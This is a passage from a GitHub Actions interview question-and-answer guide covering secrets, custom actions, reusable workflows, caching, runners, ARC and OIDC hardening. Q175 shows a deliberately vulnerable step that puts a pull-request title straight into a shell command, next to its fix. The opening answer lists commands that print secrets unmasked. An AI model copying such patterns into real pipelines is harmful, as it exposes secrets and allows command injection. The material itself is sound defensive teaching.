It leaks. Masking replaces exact substrings only. `echo $SECRET | base64`, `echo ${SECRET:0:10}`, `jq` reformatting, or `set -x` output with escaping can all print unmasked forms. Never print secrets, avoid `set -x` in steps with secrets, and add masks for transformed forms you must generate (`echo "::add-mask::$(echo -n "$S" | base64)"`). Treat log access as secret access when in doubt, and rotate on any suspicion.

</details>

### Q120. How do you share secrets across many repos without copying them? 🟢

<details>
<summary><b>Answer</b></summary>

Organization secrets with repository access set to "Selected repositories" (or private repos only). Better still, remove the need: OIDC to cloud providers, then read runtime secrets from AWS Secrets Manager, Azure Key Vault, GCP Secret Manager or Vault (Vault also supports GitHub OIDC via `hashicorp/vault-action` with `method: jwt`). One rotation point, no static secret in GitHub.

</details>

### Q121. How do environments relate to GitHub Deployments and the deployments API? 🔴

<details>
<summary><b>Answer</b></summary>

Every job with `environment` creates a deployment object for that environment and ref, and updates deployment statuses (`in_progress`, `success`, `failure`) automatically. The environments page and PR timeline show history ("deployed to staging 2 hours ago"), and the API (`GET /repos/{owner}/{repo}/deployments?environment=prod`) lets tooling find what SHA is in prod. A side effect: jobs that use an environment only to read its secrets still create deployment records, which clutters the history, so give such jobs a separate environment name (for example `prod-readonly`).

</details>

### Q122. Can a reusable workflow use the caller's environment secrets? 🔴

<details>
<summary><b>Answer</b></summary>

Not by passing them; environment secrets are resolved inside the job that declares the environment. If the called workflow's job sets `environment: prod`, it reads prod environment secrets of the **caller's repository** directly. `secrets: inherit` passes repo and org secrets, not environment ones. A caller job that uses `uses:` cannot itself declare `environment`, so the environment must be declared inside the reusable workflow, usually from an input.

</details>

### Q123. How do you restrict who can approve production deploys and stop someone approving their own change? 🟡

<details>
<summary><b>Answer</b></summary>

Set the prod environment's required reviewers to a team (`platform-oncall`), enable **prevent self-review**, restrict deployment branches to `main` and release tags, and disable admin bypass. Combine with branch protection on `main` (required reviews, CODEOWNERS on `.github/workflows/`) so the person cannot change the workflow to remove the environment line without review.

</details>

### Q124. What is a custom deployment protection rule? 🔴

<details>
<summary><b>Answer</b></summary>

A GitHub App, enabled on an environment, that receives a `deployment_protection_rule` webhook when a job targets the environment and calls back with approve or reject. Use cases: block deploys outside change windows, require a ServiceNow change ticket, check Datadog for active incidents, or require a successful canary in staging. Several vendors ship ready-made apps; you can write your own. The job waits (without consuming minutes) until every rule approves.

</details>

---

## Custom Actions & Reusable Workflows

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q125. What are the three kinds of custom action and how do you choose? 🟢

<details>
<summary><b>Answer</b></summary>

- **Composite** (`runs.using: composite`): a list of steps, any language via `run`, can call other actions. Best for gluing existing tools.
- **JavaScript** (`runs.using: node24`): runs directly on the runner, fastest startup, cross-platform, full toolkit (`@actions/core`, `@actions/github`). Best for logic and API calls.
- **Docker container** (`runs.using: docker`): any language and dependencies in an image, but Linux runners only and slower (image build or pull each run).

</details>

### Q126. Write a minimal composite action that installs Node and dependencies with caching. 🟡

<details>
<summary><b>Answer</b></summary>

`.github/actions/setup-app/action.yml`:

```yaml
name: Setup app
description: Install Node and npm dependencies with cache
inputs:
  node-version:
    description: Node.js version
    default: "22"
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm
    - run: npm ci
      shell: bash
```

Use with `- uses: ./.github/actions/setup-app` after `actions/checkout`. Every `run` step in a composite action must declare `shell`.

</details>

### Q127. What can a composite action not do compared to a job? 🟡

<details>
<summary><b>Answer</b></summary>

It cannot read the `secrets` context (pass secrets as inputs), cannot set `runs-on`, `environment`, `permissions`, `services`, `strategy` or `timeout-minutes` for the job, and cannot define job-level concurrency. Its steps show as one collapsed step in the log (less visibility), and `continue-on-error` support inside composite steps is limited. If you need any of those, you want a reusable workflow.

</details>

### Q128. How do you pass outputs out of a composite action? 🟡

<details>
<summary><b>Answer</b></summary>

Map an internal step output to an action output with `value`:

```yaml
outputs:
  version:
    description: App version
    value: ${{ steps.v.outputs.version }}
runs:
  using: composite
  steps:
    - id: v
      shell: bash
      run: echo "version=$(jq -r .version package.json)" >> "$GITHUB_OUTPUT"
```

The caller reads `steps.<caller-step-id>.outputs.version`.

</details>

### Q129. What does `action.yml` contain for a JavaScript action? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
name: PR size labeler
description: Labels PRs by changed lines
inputs:
  token:
    description: GitHub token
    default: ${{ github.token }}
outputs:
  size:
    description: xs, s, m, l, xl
runs:
  using: node24
  main: dist/index.js
  post: dist/cleanup.js     # optional
branding:
  icon: tag
  color: blue
```

`node24` is the current runtime; `node20` actions are being phased out and older `node12`/`node16` actions are forced onto newer Node with warnings.

</details>

### Q130. Why must a JavaScript action commit its `dist/` or `node_modules`? 🟡

<details>
<summary><b>Answer</b></summary>

The runner downloads the action repository at the ref and runs `main` directly; it does not run `npm install`. Without bundled dependencies you get `Error: Cannot find module '@actions/core'`. Bundle into a single file with `@vercel/ncc` or Rollup, commit `dist/`, and add a CI check that rebuilds and fails if `dist/` differs from the committed copy, so source and shipped code never diverge.

```bash
npx @vercel/ncc build src/index.js -o dist --source-map --license licenses.txt
```

</details>

### Q131. Show the core of a JavaScript action using the toolkit. 🔴

<details>
<summary><b>Answer</b></summary>

```js
const core = require('@actions/core');
const github = require('@actions/github');

async function run() {
  try {
    const token = core.getInput('token', { required: true });
    const octokit = github.getOctokit(token);
    const { owner, repo } = github.context.repo;
    const pr = github.context.payload.pull_request;
    if (!pr) { core.info('Not a PR, skipping'); return; }
    const { data } = await octokit.rest.pulls.get({ owner, repo, pull_number: pr.number });
    const lines = data.additions + data.deletions;
    const size = lines < 50 ? 'xs' : lines < 200 ? 's' : lines < 800 ? 'm' : 'l';
    await octokit.rest.issues.addLabels({ owner, repo, issue_number: pr.number, labels: [`size/${size}`] });
    core.setOutput('size', size);
  } catch (err) {
    core.setFailed(err.message);
  }
}
run();
```

`core.setFailed` sets exit code 1 and an error annotation.

</details>

### Q132. How do you write a Docker container action and pass inputs to it? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
# action.yml
name: Kubeconform
inputs:
  path: { description: Manifests dir, default: k8s }
runs:
  using: docker
  image: Dockerfile            # or docker://ghcr.io/org/kubeconform-action:1.2.0
  args:
    - ${{ inputs.path }}
```

```dockerfile
FROM ghcr.io/yannh/kubeconform:v0.6.7-alpine
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

Inputs also arrive as env vars `INPUT_PATH`. The workspace is mounted at `/github/workspace`. Prefer a prebuilt published image over `Dockerfile` so consumers do not rebuild it every run.

</details>

### Q133. What are the limitations of Docker container actions? 🟡

<details>
<summary><b>Answer</b></summary>

Linux runners only (`Container action is only supported on Linux` elsewhere), the runner must have Docker (some self-hosted and ARC Kubernetes-mode runners do not), slower startup due to build or pull, and files they create may be owned by root in the workspace. They cannot easily use tools installed on the host by earlier steps. For cross-platform actions, choose JavaScript.

</details>

### Q134. How should you version and release a custom action? 🟡

<details>
<summary><b>Answer</b></summary>

Semantic version tags (`v1.2.3`) plus a moving major tag (`v1`) that you force-update to the latest compatible release, so consumers can choose `@v1` (convenience) or `@<sha>` (security). Publish via GitHub Releases, optionally to the Marketplace (requires `action.yml` at repo root and a unique name). With **immutable releases** enabled, a release's tag and assets cannot be changed after publishing, which protects consumers pinning to version tags. Keep a changelog and never move a full semver tag.

</details>

### Q135. What is a reusable workflow, and how is it called? 🟢

<details>
<summary><b>Answer</b></summary>

A workflow with `on: workflow_call`, called as a job:

```yaml
jobs:
  deploy-dev:
    uses: ./.github/workflows/deploy.yml          # same repo
    with:
      environment: dev
      image-digest: ${{ needs.build.outputs.digest }}
    secrets: inherit
  deploy-shared:
    uses: devopsshack/platform-workflows/.github/workflows/deploy-eks.yml@v3   # another repo
```

A calling job can only contain `uses`, `with`, `secrets`, `needs`, `if`, `strategy`, `permissions` and `concurrency`, not `runs-on` or `steps`.

</details>

### Q136. How do you declare inputs, secrets and outputs in a reusable workflow? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
      replicas: { type: number, default: 2 }
      dry-run: { type: boolean, default: false }
    secrets:
      SLACK_WEBHOOK: { required: false }
    outputs:
      url:
        description: Deployed URL
        value: ${{ jobs.deploy.outputs.url }}
jobs:
  deploy:
    runs-on: ubuntu-24.04
    outputs:
      url: ${{ steps.out.outputs.url }}
```

Input types are `string`, `number` and `boolean` only. Outputs must be mapped from job outputs via the `jobs` context.

</details>

### Q137. What does `secrets: inherit` do, and when should you avoid it? 🟡

<details>
<summary><b>Answer</b></summary>

It passes all secrets the caller can access (repo and org) to the called workflow, without listing them. Convenient within one repo or a trusted org. Avoid it when calling a workflow owned by another team or a third party, since it hands over every secret including unrelated ones. Pass named secrets explicitly instead, so the interface is documented and minimal. `inherit` works only within the same org or enterprise.

</details>

### Q138. How do permissions flow into a reusable workflow? 🔴

<details>
<summary><b>Answer</b></summary>

The called workflow's `GITHUB_TOKEN` gets the caller job's permissions as a ceiling. The called workflow can only keep or **reduce** them in its own `permissions` block; it cannot elevate. So if the reusable deploy needs `id-token: write`, the caller job must grant it:

```yaml
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/deploy.yml
```

Missing this shows up as `Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable` inside the called workflow, or as the run failing to start with a permissions error.

</details>

### Q139. What are the nesting and count limits for reusable workflows? 🔴

<details>
<summary><b>Answer</b></summary>

Reusable workflows can call other reusable workflows, up to a fixed nesting depth, and a run can reference a limited number of unique reusable workflows. For years the limits were 4 levels and 20 workflows; GitHub raised them in late 2025 (to 10 levels and 50 workflows). Loops are not allowed. In practice, more than two levels makes debugging and permissions reasoning painful; prefer a flat set of building blocks.

</details>

### Q140. How do you reference a reusable workflow from a private repository? 🟡

<details>
<summary><b>Answer</b></summary>

Use the full path with a ref, and in the source repo's Settings, Actions, General, set **Access** to "Accessible from repositories in the organization" (or enterprise). Then:

```yaml
uses: devopsshack/platform-workflows/.github/workflows/build.yml@3f1e2d4c...   # SHA or tag
```

The same access setting governs private actions. Without it the caller fails with an error that the workflow was not found or is not accessible.

</details>

### Q141. Can a reusable workflow be used with a matrix? 🟡

<details>
<summary><b>Answer</b></summary>

Yes, the calling job can have `strategy.matrix`, and each leg calls the reusable workflow with different inputs:

```yaml
jobs:
  deploy:
    strategy:
      matrix:
        env: [dev, staging]
    uses: ./.github/workflows/deploy.yml
    with:
      environment: ${{ matrix.env }}
```

Outputs from a matrix of reusable workflow calls follow the same last-writer-wins rule as normal matrix jobs.

</details>

### Q142. Reusable workflow vs composite action: give a decision you would make for three cases. 🔴

<details>
<summary><b>Answer</b></summary>

- "Every service must build, scan and push an image the same way, with OIDC and environment approval for prod": **reusable workflow**, because it needs jobs, permissions, environments and centrally controlled runners.
- "Twenty repos copy the same five setup steps (checkout, setup-node, cache, npm ci, lint config)": **composite action**, because it is steps inside the consumer's job.
- "Parse a coverage report and post a formatted PR comment with thresholds": **JavaScript action**, because it is logic and API calls, needs tests, and must run on any OS.

Interviewers want: reusable workflow equals job-level template with governance; composite equals step-level macro.

</details>

### Q143. How do you see the steps of a called reusable workflow in the logs, and how is it named? 🟢

<details>
<summary><b>Answer</b></summary>

Called workflows appear as jobs named `<caller job> / <called job>` (for example `deploy-dev / deploy`), each with its full step logs, unlike composite actions which collapse into one step. The run graph shows them nested under the caller job. Required status checks must use that combined name.

</details>

### Q144. How can an organization enforce that every repo runs a specific workflow? 🔴

<details>
<summary><b>Answer</b></summary>

Repository rulesets with the "Require workflows to pass before merging" rule (successor of the earlier "required workflows" feature): pick a workflow file from a central repo and a ref, target repositories by name pattern or property, and the workflow runs on PRs of every targeted repo and must pass. Combined with org-level allowed-actions policies and required reviewers on `.github/workflows/**` via CODEOWNERS, this is how platform teams enforce security scanning org-wide.

</details>

### Q145. How do you test a custom action before releasing it? 🟡

<details>
<summary><b>Answer</b></summary>

Unit-test the logic (Jest or `node --test`, mocking `@actions/core` inputs via `INPUT_*` env vars), then an integration workflow in the action's repo that uses the action locally:

```yaml
- uses: actions/checkout@v4
- id: self
  uses: ./
  with:
    path: test/fixtures
- run: test "${{ steps.self.outputs.result }}" = "ok"
```

Run it on a matrix of `ubuntu`, `windows`, `macos` if it claims cross-platform support. `nektos/act` helps for fast local iteration but is not a full replacement for real runners.

</details>

### Q146. What is `nektos/act` and what are its limits? 🟡

<details>
<summary><b>Answer</b></summary>

`act` runs workflows locally in Docker containers that mimic runner images, which speeds up iteration on syntax and scripts:

```bash
act pull_request -j test --secret-file .secrets -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
```

Limits: images differ from real runners, no real `GITHUB_TOKEN` or OIDC, partial support for some features (service containers, caches, artifacts, reusable workflows across repos), and Windows/macOS jobs do not run. Use it for the inner loop, verify on GitHub.

</details>

### Q147. How do you consume an action from a Docker image directly, without an `action.yml`? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
- uses: docker://ghcr.io/hadolint/hadolint:v2.12.0
  with:
    args: hadolint Dockerfile
```

`with.args` and `with.entrypoint` override the image's command and entrypoint. Pin by digest (`docker://image@sha256:...`) for supply-chain safety.

</details>

### Q148. What makes a good internal action or reusable workflow interface? 🔴

<details>
<summary><b>Answer</b></summary>

Small, typed, documented inputs with safe defaults; explicit secrets (no `inherit` across teams); outputs for everything consumers need (image digest, URL); semver releases with a changelog and a moving major tag; no hidden side effects (it should not push tags unless asked); least-privilege `permissions` declared inside; pinned dependencies; and a test workflow that exercises it. We also add a `README` with a copy-paste example and keep breaking changes to major versions, because a broken shared workflow breaks hundreds of pipelines at once.

</details>

---

## Caching, Artifacts, Runners & ARC

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q149. How does `actions/cache` match keys and restore keys? 🟡

<details>
<summary><b>Answer</b></summary>

On restore it looks for an exact match of `key`; if none, it tries each `restore-keys` prefix in order and restores the **most recent** cache whose key starts with that prefix. On job end (post step), it saves under `key` only if there was no exact hit. Output `cache-hit` is `true` only for an exact match.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('requirements*.txt') }}
    restore-keys: |
      pip-${{ runner.os }}-
```

Caches are immutable: the same key is never overwritten. To refresh, change the key.

</details>

### Q150. Which caches can a branch restore from? 🔴

<details>
<summary><b>Answer</b></summary>

A run can restore caches created on its own branch (ref), on the base branch for PRs, and on the default branch. It cannot read caches from sibling feature branches or child branches. PR runs create caches scoped to `refs/pull/N/merge`, visible only to that PR. So warming caches on `main` (a push or schedule run) benefits every PR, while caches saved inside PRs mostly benefit re-runs of that PR. This isolation also prevents a malicious PR from poisoning caches used by `main`.

</details>

### Q151. What are the cache size limits and eviction rules? 🟢

<details>
<summary><b>Answer</b></summary>

Each repository gets 10 GB of cache storage by default (paid plans can raise it). Caches not accessed in 7 days are evicted, and when the repo exceeds its limit, the least recently used caches are evicted until under quota. Thrashing (constant eviction) appears when many branches save large unique caches. Inspect and clean with:

```bash
gh cache list --sort size_in_bytes --limit 20
gh cache delete --all --ref refs/pull/42/merge
```

</details>

### Q152. When should you use setup-* built-in caching instead of `actions/cache`? 🟢

<details>
<summary><b>Answer</b></summary>

Almost always for language package managers: `actions/setup-node` (`cache: npm|yarn|pnpm`), `actions/setup-python` (`cache: pip|poetry|pipenv`), `actions/setup-java` (`cache: maven|gradle`), `actions/setup-go` (on by default). They compute correct keys from lockfiles and cache the global download cache, not `node_modules`. Use `actions/cache` directly for custom paths (Terraform plugin cache, Playwright browsers, compiled outputs) or when you need split restore and save.

</details>

### Q153. Why cache the package manager's download cache rather than `node_modules`? 🔴

<details>
<summary><b>Answer</b></summary>

`npm ci` deletes `node_modules` before installing, so a cached `node_modules` is wasted; and `node_modules` contains platform-specific native builds that break across OS or Node versions. Caching `~/.npm` keeps downloads local while `npm ci` still gives a clean, lockfile-exact install. The exception is very large monorepos where install time itself dominates; then cache `node_modules` keyed on OS, Node version and lockfile hash, and skip `npm ci` on an exact hit.

</details>

### Q154. How do `actions/cache/restore` and `actions/cache/save` help? 🔴

<details>
<summary><b>Answer</b></summary>

They split the combined action so you control when and what is saved:

```yaml
- uses: actions/cache/restore@v4
  id: restore
  with:
    path: .turbo
    key: turbo-${{ github.ref_name }}-${{ github.sha }}
    restore-keys: turbo-${{ github.ref_name }}-
- run: npx turbo run build
- if: github.ref == 'refs/heads/main'
  uses: actions/cache/save@v4
  with:
    path: .turbo
    key: ${{ steps.restore.outputs.cache-primary-key }}
```

Typical uses: save only on `main` to limit cache churn, save even when tests fail, or save a cache built in a matrix leg only once.

</details>

### Q155. How do you cache Docker layers in GitHub Actions? 🟡

<details>
<summary><b>Answer</b></summary>

Use BuildKit's GitHub cache backend through `docker/build-push-action`:

```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: ${{ env.IMAGE }}:sha-${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

`mode=max` caches intermediate stages too (important for multi-stage builds). It counts toward the repo's cache quota; for big images or self-hosted runners, `type=registry,ref=<repo>:buildcache` is often better. Use a `scope` per image in monorepos so images do not evict each other.

</details>

### Q156. How do artifacts v4 differ from older versions? 🔴

<details>
<summary><b>Answer</b></summary>

`actions/upload-artifact@v4` and `download-artifact@v4` (v1 to v3 are shut down) brought: much faster uploads and downloads, artifacts available via UI and API immediately while the run is still going, **immutability** (you cannot upload to the same artifact name twice in a run), a per-job limit of 500 artifacts, and the ability to download from other runs and repos with `run-id` and `github-token`. Matrix legs must use unique names (`report-${{ matrix.os }}`) and a downstream job merges with `pattern` plus `merge-multiple: true`.

</details>

### Q157. How do retention and storage billing work for artifacts and logs? 🟢

<details>
<summary><b>Answer</b></summary>

Default retention is 90 days for artifacts and logs, configurable at org or repo level (1 to 90 days for public repos, up to 400 days for private) and per upload with `retention-days`. Artifact storage counts against the account's included Packages/Actions storage and is billed beyond it. Set short retention (1 to 7 days) for intermediate build outputs and keep release assets in GitHub Releases or a registry instead.

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: coverage
    path: coverage/
    retention-days: 5
    if-no-files-found: error
```

</details>

### Q158. Cache or artifact: classify five things. 🟢

<details>
<summary><b>Answer</b></summary>

- `~/.npm` download cache: **cache** (speed, disposable, keyed by lockfile).
- Compiled `dist/` passed from build job to deploy job in the same run: **artifact**.
- JUnit XML and coverage HTML for humans: **artifact**.
- Terraform provider plugins: **cache**.
- Release binaries: **neither long term**; attach to a GitHub Release or push to a registry.

Rule: cache may vanish at any time and the job must still work; artifacts are outputs you expect to exist.

</details>

### Q159. How does a self-hosted runner register and get work? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
mkdir actions-runner && cd actions-runner
curl -o runner.tar.gz -L https://github.com/actions/runner/releases/download/v2.329.0/actions-runner-linux-x64-2.329.0.tar.gz
tar xzf runner.tar.gz
./config.sh --url https://github.com/ORG --token "$REG_TOKEN" \
  --labels linux,x64,build --runnergroup build --ephemeral --unattended
sudo ./svc.sh install && sudo ./svc.sh start   # or ./run.sh
```

The registration token (valid one hour) is exchanged for runner credentials. The runner then opens an outbound HTTPS long poll to GitHub; no inbound ports are needed. Check the latest version on the releases page, because runners that fall too far behind are refused.

</details>

### Q160. What is an ephemeral runner, and why is it the production default? 🟡

<details>
<summary><b>Answer</b></summary>

`--ephemeral` means the runner takes exactly one job and then unregisters. Combined with a fresh VM or pod per job, there is no leftover state: no cached credentials, no poisoned tool cache, no files from another repo's job. Persistent runners leak secrets and artifacts between jobs and let one malicious job backdoor the machine for the next. Use **JIT runners** (`POST /orgs/{org}/actions/runners/generate-jitconfig`) to create single-use runners without a registration token on disk; ARC uses this internally.

</details>

### Q161. What are runner groups used for? 🔴

<details>
<summary><b>Answer</b></summary>

Runner groups (org or enterprise level) control which repositories and which workflows can use a set of self-hosted or larger runners. For example, the `prod-deploy` group with network access to production is restricted to the `platform-deploy` repo and to a specific workflow file at a specific ref, so a random repo cannot run `runs-on: prod-deploy` and reach the production VPC. Public repositories are blocked from groups by default, which you should keep.

</details>

### Q162. Why should self-hosted runners not be used with public repositories? 🔴

<details>
<summary><b>Answer</b></summary>

Anyone can fork a public repo and open a PR whose workflow (or modified build script) runs on your runner. With a persistent runner, that code can install a backdoor, steal credentials from the host (cloud metadata service, Docker socket, kubeconfig), pivot into your network, or poison the next job. Approval settings for fork PRs reduce but do not remove the risk. If unavoidable: ephemeral runners in an isolated network, no instance role, no secrets on the host, and require approval for all outside contributors.

</details>

### Q163. What is Actions Runner Controller (ARC) and what are its components? 🟡

<details>
<summary><b>Answer</b></summary>

ARC is GitHub's Kubernetes operator that runs self-hosted runners as ephemeral pods. With the supported "runner scale sets" mode:

- **Controller** (`gha-runner-scale-set-controller` chart): installs CRDs and manages scale sets.
- **Runner scale set** (`gha-runner-scale-set` chart, one per runner type): registers with GitHub; its `runs-on` name is the Helm release name.
- **Listener pod**: long-polls GitHub's scale set API for job demand and patches the `EphemeralRunnerSet` replica count.
- **EphemeralRunner pods**: one per job, registered with JIT config, deleted after the job.

It scales from `minRunners` (can be 0) to `maxRunners` without the old webhook or metrics configuration. The legacy community mode (summerwind `RunnerDeployment`) is deprecated.

</details>

### Q164. Install ARC with Helm: what are the commands? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
helm install arc \
  --namespace arc-systems --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

kubectl create secret generic gh-app -n arc-runners \
  --from-literal=github_app_id=123456 \
  --from-literal=github_app_installation_id=7890123 \
  --from-file=github_app_private_key=app.pem

helm install arc-linux \
  --namespace arc-runners --create-namespace \
  --set githubConfigUrl="https://github.com/devopsshack" \
  --set githubConfigSecret=gh-app \
  --set minRunners=1 --set maxRunners=20 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```

Workflows then use `runs-on: arc-linux`. Prefer GitHub App authentication over a PAT. Pin chart versions (`--version`) and keep controller and scale set versions equal.

</details>

### Q165. What are ARC's container modes, and how do you run Docker builds inside ARC runners? 🔴

<details>
<summary><b>Answer</b></summary>

- **Default** (no containerMode): plain runner container; no Docker, so `container:` jobs, service containers and Docker actions fail.
- **`containerMode.type: dind`**: adds a privileged Docker-in-Docker sidecar. Easy and compatible, but privileged pods weaken node isolation.
- **`containerMode.type: kubernetes`**: job containers and services become separate pods via runner container hooks; needs a RWX or ephemeral PVC for the work volume; no privileged containers, but `docker build` is not available.

For image builds without privileged pods, use rootless BuildKit, Kaniko-style builders, or a remote BuildKit service, and run ARC runner nodes in a dedicated node pool with taints.

</details>

### Q166. How does ARC scale to zero, and what is the trade-off? 🟡

<details>
<summary><b>Answer</b></summary>

With `minRunners: 0`, the listener keeps no idle runner pods; when a job is queued, it scales up, and the new pod must be scheduled, pull the runner image, and register before the job starts. If the node pool also scales to zero, add node provisioning time (Karpenter or Cluster Autoscaler, often 60 to 120 seconds). Trade-off: zero idle cost vs cold-start latency. Common compromise: `minRunners: 1` to 2 during business hours, larger and pre-pulled runner images, and a warm node.

</details>

### Q167. How do you give ARC runner pods cloud access without static credentials? 🔴

<details>
<summary><b>Answer</b></summary>

Two layers. In workflows, prefer GitHub OIDC (`id-token: write` plus `configure-aws-credentials`), which works the same on ARC as on hosted runners and keeps per-repo trust policies. Alternatively, on EKS, attach an IAM role to the runner pods' service account (IRSA or EKS Pod Identity), but then **every job** on that scale set gets that role regardless of repo, so restrict the scale set to a runner group limited to trusted repos and workflows. Block the node instance metadata service from pods (IMDSv2 hop limit 1) so jobs cannot borrow the node role.

</details>

### Q168. When would you choose larger GitHub-hosted runners over self-hosted runners? 🟡

<details>
<summary><b>Answer</b></summary>

Larger runners give more CPU and RAM, GPU, arm64, static egress IPs (for allow-lists) and Azure private networking, with zero maintenance and clean VMs per job, billed per minute. Self-hosted (or ARC) wins when you need access to private networks without VNet integration, special hardware, very high volume where per-minute pricing exceeds infrastructure cost, or warm caches on local disk. Total cost must include the engineers maintaining runner images, patching and autoscaling, which is usually the biggest line.

</details>

---

## OIDC & Security Hardening

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q169. How does GitHub OIDC work, end to end? 🟡

<details>
<summary><b>Answer</b></summary>

1. The job has `permissions: id-token: write`, so the runner gets `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`.
2. An action requests a JWT from `https://token.actions.githubusercontent.com` with an audience.
3. GitHub signs a token with claims: `iss`, `aud`, `sub`, `repository`, `ref`, `environment`, `job_workflow_ref`, `run_id`, `actor`, and more; valid for minutes.
4. The cloud provider validates signature and claims against a configured identity provider and trust conditions.
5. It returns short-lived credentials (AWS STS, Azure AD, GCP STS) scoped to a role.

No long-lived keys exist in GitHub, and stolen tokens expire quickly.

</details>

### Q170. What are the `sub` claim formats, and which do you put in an AWS trust policy? 🔴

<details>
<summary><b>Answer</b></summary>

- Branch push: `repo:ORG/REPO:ref:refs/heads/main`
- Tag: `repo:ORG/REPO:ref:refs/tags/v1.4.0`
- Environment job: `repo:ORG/REPO:environment:prod` (replaces the ref form)
- Pull request: `repo:ORG/REPO:pull_request`

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:devopsshack/shack-api:environment:prod"
  }
}
```

Use `StringLike` only for deliberate wildcards like `repo:devopsshack/shack-api:ref:refs/tags/v*`. Never `repo:devopsshack/*` for a prod role. Orgs can customize the `sub` template (for example, to include `job_workflow_ref`) via the OIDC customization API.

</details>

### Q171. Configure OIDC to AWS: provider, role and workflow. 🔴

<details>
<summary><b>Answer</b></summary>

```bash
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com
aws iam create-role --role-name gha-ecr-push --assume-role-policy-document file://trust.json
```

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::111122223333:role/gha-ecr-push
      aws-region: ap-south-1
      role-session-name: gha-${{ github.run_id }}
  - run: aws sts get-caller-identity
```

AWS validates GitHub's certificate chain itself, so the thumbprint list is no longer meaningful for this issuer (older CLI versions still demand a value).

</details>

### Q172. Configure OIDC to Azure. 🔴

<details>
<summary><b>Answer</b></summary>

Create an Entra ID app registration (or user-assigned managed identity), add a **federated credential** with issuer `https://token.actions.githubusercontent.com`, audience `api://AzureADTokenExchange`, and subject `repo:ORG/REPO:environment:prod`. Assign it an Azure RBAC role on the target scope. Then:

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: azure/login@v2
    with:
      client-id: ${{ vars.AZURE_CLIENT_ID }}
      tenant-id: ${{ vars.AZURE_TENANT_ID }}
      subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
  - run: az aks get-credentials -g rg-prod -n aks-prod
```

Azure matches the subject exactly (flexible federated credentials with patterns are newer and limited), so you need one federated credential per branch or environment.

</details>

### Q173. Configure OIDC to GCP. 🔴

<details>
<summary><b>Answer</b></summary>

Create a Workload Identity Pool and an OIDC provider with an attribute mapping and a condition, then let the GitHub principal impersonate a service account (or grant roles directly to the principal set).

```bash
gcloud iam workload-identity-pools providers create-oidc github \
  --location=global --workload-identity-pool=github-pool \
  --issuer-uri=https://token.actions.githubusercontent.com \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository" \
  --attribute-condition="assertion.repository_owner == 'devopsshack'"
```

```yaml
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github-pool/providers/github
    service_account: deployer@shack-prod.iam.gserviceaccount.com
```

The attribute condition is mandatory now; without it any GitHub repo could authenticate to your pool.

</details>

### Q174. Why pin actions to a full commit SHA, and how do you keep pins updated? 🟡

<details>
<summary><b>Answer</b></summary>

Tags and branches are mutable. In March 2025 attackers rewrote the tags of the popular `tj-actions/changed-files` action to a malicious commit that dumped runner memory (secrets) into public logs, affecting every repo that used `@v45` or `@v44`. A 40-character SHA cannot be repointed.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

Keep pins fresh with Dependabot (`package-ecosystem: github-actions`) or Renovate, which update the SHA and the version comment. Org admins can enforce SHA pinning with the allowed-actions policy.

</details>

### Q175. What is script injection, and how do you fix it? 🔴

<details>
<summary><b>Answer</b></summary>

Interpolating attacker-controlled context into `run:` lets them inject shell commands, because `${{ }}` is substituted into the script text.

```yaml
# Vulnerable
- run: echo "Title: ${{ github.event.pull_request.title }}"
# Fixed
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

Untrusted fields include PR and issue titles and bodies, comment bodies, branch names (`head_ref`), commit messages, author names and emails, and labels. The same applies to `actions/github-script` `script:` blocks. Linters like `actionlint` and `zizmor` flag these patterns.

</details>

### Q176. What is the threat model of a GitHub Actions workflow? 🔴

<details>
<summary><b>Answer</b></summary>

